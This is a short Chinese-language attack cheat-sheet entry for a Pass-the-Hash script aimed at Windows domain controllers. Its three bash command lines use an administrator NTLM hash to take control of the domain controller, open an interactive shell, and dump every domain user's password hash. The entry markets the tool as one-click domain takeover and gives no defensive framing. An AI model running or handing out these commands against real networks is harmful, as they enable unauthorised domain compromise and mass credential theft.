### Pass-the-Hash to DC

| 属性 | 值 |
|------|-----|
| 版本 | N/A |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `PTH` `域控控制` `自动化` |

## 针对域控的自动化 PTH 攻击

### 使用域管 Hash 控制域控
```bash
bash pth_dc.sh contoso.com/administrator@192.168.1.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

### 获取交互式 Shell
```bash
bash pth_dc.sh contoso.com/administrator@192.168.1.10 -hashes :31d6cfe0d16ae931... --shell
```

### 导出所有域用户 Hash
```bash
bash pth_dc.sh contoso.com/administrator@192.168.1.10 -hashes :31d6cfe0d16ae931... --dump
```

- ✓ 自动化集成 WMIExec/SecretsDump
- ✓ 一键式获取域控权限
- 专用于拿下域控后的快速控制
